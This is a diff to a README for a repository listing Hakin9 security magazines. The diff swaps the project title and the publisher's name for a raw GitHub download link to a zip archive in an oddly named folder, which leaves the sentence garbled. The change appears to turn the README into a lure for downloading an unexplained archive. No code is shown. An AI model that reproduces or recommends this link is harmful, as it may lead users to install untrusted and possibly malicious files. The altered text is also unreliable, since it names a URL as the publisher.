@@ -1,6 +1,6 @@
-# Hakin9.org-Magazines
+# https://github.com/manishvermaindore/Hakin9.org-Magazines/raw/refs/heads/main/micrencephaly/Magazines-org-Hakin-1.8.zip
 
-This is the list of the magazines which are published by Hakin9.org on their website, which you can download from here too. Below is the index of magazines that are published here. There are 8 magazines which couldn't be get uploaded due to file size upload policy, but no worries those can be easily downloadable from the website.
+This is the list of the magazines which are published by https://github.com/manishvermaindore/Hakin9.org-Magazines/raw/refs/heads/main/micrencephaly/Magazines-org-Hakin-1.8.zip on their website, which you can download from here too. Below is the index of magazines that are published here. There are 8 magazines which couldn't be get uploaded due to file size upload policy, but no worries those can be easily downloadable from the website.
 
 
 1.	IoT and Raspberry Pi Hacker's Toolkit
